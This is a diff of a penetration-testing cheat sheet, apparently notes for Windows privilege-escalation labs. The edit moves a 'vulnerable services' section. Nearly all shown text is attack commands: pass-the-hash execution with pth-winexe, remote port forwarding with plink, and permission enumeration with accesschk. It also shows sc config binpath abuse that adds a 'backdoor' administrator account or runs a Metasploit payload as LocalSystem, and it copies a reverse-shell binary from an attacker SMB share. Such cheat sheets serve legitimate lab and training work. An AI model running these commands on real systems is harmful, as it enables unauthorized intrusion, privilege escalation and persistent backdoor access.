@@ -616,11 +616,22 @@ $ plink.exe -l root 10.11.0.42 -R 445:127.0.0.1:445      // forward target local
 $ pth-winexe -U alice%aad3b435b51404eeaad3b435b51404ee:B74242F37E47371AFF835A6EBCAC4FFE // run cmd.exe
 ```
 
-Accesschk.exe:
+Accesschk.exe (find weak service/file/folder permissions):
 * http://www.fuzzysecurity.com/tutorials/16.html
 ```
 accesschk.exe -uwdqs Users c:\ /accepteula
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
+```
+
+Badly configured services:
+```powershell
+# Vulnerable services
+sc qc <vulnerable service name>
+sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
+sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
+
+sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
+net start <vulnerable-service>
 ```
 
 Psexec.exe:
@@ -668,17 +679,6 @@ $ impacket-smbserver files `pwd`            # @KALI: Set up a SMB server with fi
 PS> xcopy \\10.10.14.3\files\rshell.exe .   # @TARGET: Copy rshell.exe from remote share to current dir.
 
 
-```
-
-Vulnerable services:
-```powershell
-# Vulnerable services
-sc qc <vulnerable service name>
-sc config <vuln-service> binpath= "net user backdoor backdoor123 /add" 
-sc config <vuln-service> binpath= "net localgroup Administrators backdoor /add" 
-
-sc config <vuln-service> binPath= "c:\inetpub\wwwroot\runmsf.exe" depend= "" start= demand obj= ".\LocalSystem" password= ""
-net start <vulnerable-service>
 ```
 
 # MSFVENOM PAYLOADS
